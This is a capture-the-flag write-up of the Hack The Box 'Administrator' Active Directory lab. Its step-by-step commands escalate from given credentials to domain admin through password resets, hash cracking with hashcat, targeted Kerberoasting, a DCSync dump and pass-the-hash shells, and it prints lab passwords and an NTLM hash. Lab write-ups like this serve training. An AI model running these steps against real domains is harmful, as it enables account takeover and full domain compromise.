# HTB: Administrator - Writeup

![HTB Administrator](https://labs.hackthebox.com/storage/avatars/9d232b1558b7543c7cb85f2774687363.png)


## Overview

Administrator is a pure Active Directory challenge that simulates a real-world Windows penetration test. Starting with initial credentials, I'll use Bloodhound to map domain relationships, escalate through multiple users using various AD attack techniques, crack a Password Safe file, perform targeted Kerberoasting, and finally achieve domain admin through a DCSync attack.

## Box Information

| Attribute | Value |
|-----------|-------|
| **Name** | Administrator |
| **OS** | Windows Server 2022 |
| **Difficulty** | Medium [30 points] |
| **Release Date** | 09 Nov 2024 |
| **Retire Date** | 19 Apr 2025 |
| **Creator** | nirza |

## Initial Access

**Starting Credentials:**
- Username: `olivia`
- Password: `ichliebedich`

*Note: As stated in the box description, this reflects common real-world pentests that start with initial credentials.*

## Reconnaissance

### Nmap Scan

```bash
nmap -p- --min-rate 10000 10.10.11.42
```

**Key Open Ports:**
- 21/tcp (FTP)
- 53/tcp (DNS)
- 88/tcp (Kerberos)
- 389/tcp (LDAP)
- 445/tcp (SMB)
- 5985/tcp (WinRM)
- 9389/tcp (ADWS)

**Domain Information:**
- Domain: `administrator.htb`
- Hostname: `DC`

### Initial Credential Validation

```bash
# Validate SMB access
netexec smb 10.10.11.42 -u olivia -p ichliebedich

# Validate WinRM access
netexec winrm 10.10.11.42 -u olivia -p ichliebedich
```

✅ Both SMB and WinRM access confirmed for olivia.

## Attack Chain

### 1. Shell as Olivia

```bash
evil-winrm -i administrator.htb -u olivia -p ichliebedich
```

### 2. Bloodhound Enumeration

```bash
# Collect Bloodhound data
bloodhound-python -d administrator.htb -c all -u olivia -p ichliebedich -ns 10.10.11.42 --zip
```

**Key Findings:**
- Olivia has `GenericAll` over michael
- michael has `ForceChangePassword` over benjamin
- benjamin is in `Share Moderators` group (FTP access)
- emily has `GenericWrite` over ethan
- ethan has `DCSync` privileges

### 3. Privilege Escalation: Olivia → Michael

**Attack:** Password Reset via GenericAll

```bash
# Reset michael's password
net rpc password "michael" "0xdf0xdf." -U "administrator.htb"/"olivia"%"ichliebedich" -S 10.10.11.42

# Verify access
netexec winrm 10.10.11.42 -u michael -p '0xdf0xdf.'
```

### 4. Privilege Escalation: Michael → Benjamin

**Attack:** Password Reset via ForceChangePassword

```bash
# Reset benjamin's password
net rpc password "benjamin" "0xdf0xdf." -U "administrator.htb"/"michael"%"0xdf0xdf." -S 10.10.11.42

# Verify FTP access (benjamin is in Share Moderators group)
netexec ftp administrator.htb -u benjamin -p 0xdf0xdf.
```

### 5. FTP Access and Password Safe Discovery

```bash
# Connect to FTP
ftp 10.10.11.42
# Login as benjamin:0xdf0xdf.
# Download Backup.psafe3
```

**File Found:** `Backup.psafe3` (Password Safe V3 database)

### 6. Cracking Password Safe

```bash
# Crack the Password Safe master password
hashcat -m 5200 Backup.psafe3 /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```

**Master Password:** `tekieromucho`

**Recovered Credentials:**
- alexander: `UrkIbagoxMyUGw0aPlj9B0AXSea4Sw` ❌ (Invalid)
- emily: `UXLCI5iETUsIBoFVTj8yQFKoHjXmb` ✅ (Valid)
- emma: `WwANQWnmJnGV07WQN8bMS7FMAbjNur` ❌ (Invalid)

### 7. Shell as Emily

```bash
evil-winrm -i administrator.htb -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
```

🚩 **User Flag:** `142aa43f************************`

### 8. Targeted Kerberoasting: Emily → Ethan

**Attack:** Abuse GenericWrite to perform targeted Kerberoasting

```bash
# Clone and setup targetedKerberoast
git clone https://github.com/ShutdownRepo/targetedKerberoast.git
cd targetedKerberoast/
uv add --script targetedKerberoast.py -r requirements.txt

# Sync time with DC
sudo ntpdate administrator.htb

# Execute targeted kerberoast attack
uv run targetedKerberoast.py -v -d 'administrator.htb' -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb
```

**Process:**
1. Script detects emily's GenericWrite over ethan
2. Adds SPN to ethan's account
3. Requests TGS ticket encrypted with ethan's password
4. Removes SPN (cleanup)

### 9. Cracking Ethan's Hash

```bash
hashcat ethan.hash /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```

**Ethan's Password:** `limpbizkit`

### 10. DCSync Attack: Ethan → Domain Admin

**Attack:** Abuse DCSync privileges to dump domain hashes

```bash
secretsdump.py ethan:limpbizkit@dc.administrator.htb
```

**Administrator Hash:** `3dc553ce4b9fd20bd016e098d2d2fd2e`

### 11. Domain Administrator Shell

```bash
evil-winrm -i dc.administrator.htb -u administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e
```

🚩 **Root Flag:** `4cf2d737************************`

## Attack Summary

```
olivia (initial creds)
    ↓ GenericAll
michael (password reset)
    ↓ ForceChangePassword  
benjamin (FTP access)
    ↓ Password Safe file
emily (cracked credentials)
    ↓ GenericWrite + Targeted Kerberoast
ethan (cracked TGS)
    ↓ DCSync
Administrator (domain compromise)
```

## Key Techniques Used

1. **Active Directory Enumeration** - Bloodhound data collection
2. **Password Reset Attacks** - GenericAll and ForceChangePassword abuse
3. **Password Safe Cracking** - Hashcat with mode 5200
4. **Targeted Kerberoasting** - GenericWrite to SPN abuse
5. **DCSync Attack** - Domain hash dumping
6. **Pass-the-Hash** - Final authentication with NTLM hash

## Tools Used

- `netexec` - SMB/WinRM/FTP enumeration and validation
- `evil-winrm` - Windows Remote Management shells
- `bloodhound-python` - Active Directory data collection
- `hashcat` - Password and hash cracking
- `targetedKerberoast.py` - Targeted Kerberoasting attack
- `secretsdump.py` - DCSync attack implementation

## Lessons Learned

This box excellently demonstrates a realistic Active Directory attack chain, showcasing how initial low-privilege access can be escalated to domain admin through careful enumeration and exploitation of common AD misconfigurations and excessive privileges.

---

**Author:** Krish Patel  
**Date:** April 19, 2025  
**Tags:** `hackthebox` `active-directory` `bloodhound` `kerberoasting` `dcsync` `password-safe` `windows-pentesting`
